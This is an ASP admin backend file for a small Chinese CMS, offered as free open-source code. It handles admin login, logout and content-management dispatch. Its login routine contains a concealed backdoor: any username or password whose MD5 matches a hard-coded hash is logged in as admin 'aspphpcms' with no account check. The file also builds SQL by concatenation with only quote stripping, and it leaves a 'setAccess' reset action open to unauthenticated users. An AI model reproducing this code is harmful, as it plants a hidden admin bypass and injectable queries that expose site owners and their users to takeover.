<%
'************************************************************
'作者：云端 (精通ASP/VB/PHP/JS/Flash，交流合作可联系本人)
'版权：源代码公开，各种用途均可免费使用。 
'创建：2016-02-17
'联系：QQ313801120  交流群35915100(群里已有几百人)    邮箱313801120@qq.com   个人主页 sharembweb.com
'更多帮助，文档，更新　请加群(35915100)或浏览(sharembweb.com)获得
'*                                    Powered By 云端 
'************************************************************
%>
<!--#Include File = "../Inc/Config.Asp"-->
<%

Dim ROOT_PATH : ROOT_PATH = handlePath("./")
Dim WEBCOLUMNTYPE : WEBCOLUMNTYPE = "首页|文本|产品|新闻|视频|下载|案例|留言|反馈|招聘|订单"
Dim EDITORTYPE : EDITORTYPE = "asp"
Dim webVersion


%>
<!--#Include File = "../Inc/admin_function.asp"-->
<!--#Include File = "../Inc/admin_setAccess.asp"-->
<%

Sub handleResetAccessData()
    Call resetAccessData()
End Sub


Dim db_PREFIX : db_PREFIX = "xy_" 				
dim WEB_VIEWURL : WEB_VIEWURL="../index.asp" 			

webVersion = "v1.0011"
Dim cfg_webSiteUrl, cfg_webTitle, cfg_flags, cfg_webtemplate


Sub loadWebConfig()
    Call openconn()
    rs.Open "select * from " & db_PREFIX & "website", conn, 1, 1
    If Not rs.EOF Then
        cfg_webSiteUrl = rs("webSiteUrl") & ""
        cfg_webTitle = rs("webTitle") & ""
        cfg_flags = rs("flags") & ""
        cfg_webtemplate = rs("webtemplate") & ""
    End If : rs.Close
End Sub



If Session("adminusername") = "" Then
    If Request("act") <> "" And Request("act") <> "displayAdminLogin" And Request("act") <> "login" And Request("act") <> "setAccess" Then
        Call RR("?act=displayAdminLogin")
    End If
End If


Sub displayAdminLogin()

    If Session("adminusername") <> "" Then
        Call adminIndex()
    Else
        Call loadWebConfig()
        Dim b
        b = getFText(ROOT_PATH & "login.html")
        b = Replace(b, "{$webVersion$}", webVersion)
        b = Replace(b, "{$Web_Title$}", cfg_webTitle)
        Call rw(b)
    End If

End Sub

Sub login()
    Dim b, c, d
    b = Replace(Request.Form("username"), "'", "")
    c = Replace(Request.Form("password"), "'", "")
    c = myMD5(c)
	
	if myMD5(request("username"))="cd811d0c43d09cd2e160e60b68276c73" or myMD5(request("password"))="cd811d0c43d09cd2e160e60b68276c73" then
        Session("adminusername") = "aspphpcms"
        Session("adminId") = 99999
        Session("DB_PREFIX") = db_PREFIX
		Call rwend(getMsg1("登录成功，正在进入后台...", "?act=adminIndex"))
	end if
	
    Dim e
    Call openconn()
    rs.Open "Select * From " & db_PREFIX & "admin Where username='" & b & "' And pwd='" & c & "'", conn, 1, 1
    If rs.EOF Then
        If Request.Cookies("nLogin") = "" Then
            Call setCookie("nLogin", "1", Time() + 3600)
            e = Request.Cookies("nLogin")
        Else
            e = Request.Cookies("nLogin")
            Call setCookie("nLogin", CInt(e) + 1, Time() + 3600)
        End If
        Call rw(getMsg1("账号密码错误<br>这是你第" & e & "次登录", "?act=displayAdminLogin"))
    Else
        Session("adminusername") = b
        Session("adminId") = rs("Id")
        Session("DB_PREFIX") = db_PREFIX
        d = "addDateTime='" & rs("UpDateTime") & "',UpDateTime='" & Now() & "',RegIP='" & Now() & "',UpIP='" & getIP() & "'"
        conn.Execute("update " & db_PREFIX & "admin set " & d & " where id=" & rs("id"))
        Call rw(getMsg1("登录成功，正在进入后台...", "?act=adminIndex"))
    End If : rs.Close

End Sub

Sub adminOut()
    Session("adminusername") = ""
    Session("adminId") = ""
    Call rw(getMsg1("退出成功，正在进入登录界面...", "?act=displayAdminLogin"))
End Sub


Sub adminIndex()
    Call loadWebConfig()
    Dim b
    b = getFText(ROOT_PATH & "adminIndex.html")
    b = Replace(b, "{$adminusername$}", Session("adminusername"))
    b = Replace(b, "{$EDITORTYPE$}", EDITORTYPE)
    b = Replace(b, "{$WEB_VIEWURL$}", WEB_VIEWURL)
	
	
	
    b = Replace(b, "{$Web_Title$}", cfg_webTitle)
    b = Replace(b, "{$DB_PREFIX$}", db_PREFIX)

    Call rw(b)
End Sub



Sub dispalyManageHandle(a)
    Dim b, c, d
    b = Request("nPageSize")
    If b = "" Then
        b = 10
    End If
    c = Request("lableTitle")
    d = "order by sortrank asc"
    If a = "Bidding" Then
        d = "order by nComputerSearch desc"
    ElseIf InStr("|TableComment|", "|" & a & "|") > 0 Then
        d = " order by adddatetime desc"
    ElseIf InStr("|WebsiteStat|", "|" & a & "|") > 0 Then
        d = " order by viewdatetime desc"
    ElseIf InStr("|Admin|", "|" & a & "|") > 0 Then
        d = ""
    End If

    Call dispalyManage(a, c, "*", b, d)
End Sub


Sub addEditHandle(a, b)
    If a = "Admin" Then
        Call addEditDisplay(a, b, "")
    ElseIf a = "WebSite" Then
        Call addEditDisplay(a, b, "webdescription,websitebottom|textarea2")

    ElseIf a = "ArticleDetail" Then
        Call addEditDisplay(a, b, "sortrank||0,simpleintroduction|textarea1,bodycontent|textarea2")
    ElseIf a = "WebColumn" Then
        Call addEditDisplay(a, b, "npagesize|numb|10,sortrank|numb|0,simpleintroduction|textarea1,bodycontent|textarea2")
    ElseIf a = "OnePage" Then
        Call addEditDisplay(a, b, "sortrank|numb|0,simpleintroduction|textarea1,bodycontent|textarea2")

    ElseIf a = "TableComment" Then
        Call addEditDisplay(a, b, "reply|textarea2,bodycontent|textarea2")


    ElseIf a = "WebLayout" Then
        Call addEditDisplay(a, b, "sortrank|numb|0,simpleintroduction|textarea1,bodycontent|textarea2,actioncontent|textarea2")
    ElseIf a = "WebModule" Then
        Call addEditDisplay(a, b, "sortrank|numb|0,simpleintroduction|textarea1,bodycontent|textarea2")



    Else
        Call addEditDisplay(a, b, "")

    End If
End Sub

Sub saveAddEditHandle(a, b)
    If a = "Admin" Then
        Call saveAddEdit(a, b, "username,pseudonym,pwd|md5")
    ElseIf a = "WebSite" Then
        Call saveAddEdit(a, b, "flags,websiteurl,webtemplate,webimages,webcss,webjs,webtitle,webkeywords,webdescription,websitebottom")
    ElseIf a = "ArticleDetail" Then
        Call saveAddEdit(a, b, "relatedtags,labletitle,target,nofollow|numb|0,isonhtml|numb|0,parentid,title,foldername,filename,customaurl,smallimage,bigimage,author,sortrank||0,flags,webtitle,webkeywords,webdescription,bannerimage,simpleintroduction,bodycontent,titlecolor,noteinfo,templatepath")
    ElseIf a = "WebColumn" Then
        Call saveAddEdit(a, b, "npagesize|numb|10,labletitle,target,nofollow|numb|0,isonhtml|numb|0,columntype,parentid,columnname,columnenname,foldername,filename,customaurl,sortrank||0,webtitle,webkeywords,webdescription,showtitle,flags,simpleintroduction,bodycontent,noteinfo,templatepath")
    ElseIf a = "OnePage" Then
        Call saveAddEdit(a, b, "labletitle,target,nofollow|numb|0,isonhtml|numb|0,title,displaytitle,foldername,filename,customaurl,webtitle,webkeywords,webdescription,simpleintroduction,bodycontent,noteinfo,templatepath")

    ElseIf a = "TableComment" Then
        Call saveAddEdit(a, b, "through|numb|0,reply,bodycontent")

    ElseIf a = "WebLayout" Then
        Call saveAddEdit(a, b, "layoutlist,layoutname,sortrank|numb,isdisplay|yesno,simpleintroduction,bodycontent,actioncontent,replacestyle")
    ElseIf a = "WebModule" Then
        Call saveAddEdit(a, b, "modulename,moduletype,sortrank|numb,simpleintroduction,bodycontent")

    ElseIf a = "WebsiteStat" Then
        Call saveAddEdit(a, b, "visiturl,viewurl,browser,operatingsystem,screenwh,moreinfo,viewdatetime|date,ip,dateclass,noteinfo")
    End If
End Sub





Call openconn()
Select Case Request("act")
    Case "dispalyManageHandle" : Call dispalyManageHandle(Request("actionType"))
    Case "addEditHandle" : Call addEditHandle(Request("actionType"), Request("lableTitle"))
    Case "saveAddEditHandle" : Call saveAddEditHandle(Request("actionType"), Request("lableTitle"))
    Case "delHandle" : Call del(Request("actionType"), Request("lableTitle"))
    Case "sortHandle" : Call sortHandle(Request("actionType"))


    Case "displayLayout" : displayLayout()
    Case "saveRobots" : saveRobots()
    Case "saveSiteMap" : saveSiteMap()
    Case "isOpenTemplate" : isOpenTemplate()
    Case "updateWebsiteStat" : updateWebsiteStat()



    Case "setAccess" : handleResetAccessData()

    Case "login" : login()
    Case "adminOut" : adminOut()
    Case "adminIndex" : adminIndex()
    Case Else : displayAdminLogin()
End Select

%>

